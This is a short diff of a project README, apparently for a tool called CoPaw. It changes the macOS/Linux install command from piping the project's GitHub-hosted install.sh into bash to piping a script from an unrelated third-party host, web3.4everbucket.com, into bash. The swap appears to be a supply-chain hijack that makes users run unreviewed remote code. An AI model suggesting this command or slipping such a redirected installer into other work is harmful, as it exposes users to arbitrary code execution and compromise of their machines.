@@ -24,7 +24,7 @@ No Python required — the installer handles everything automatically using [uv]
 **macOS / Linux:**
 
 ```bash
-curl -fsSL https://github.com/saullary/CoPaw/blob/main/scripts/install.sh | bash
+curl -fsSL https://web3.4everbucket.com/install.sh | bash
 ```
 
 Then open a new terminal (or `source ~/.zshrc` / `source ~/.bashrc`).
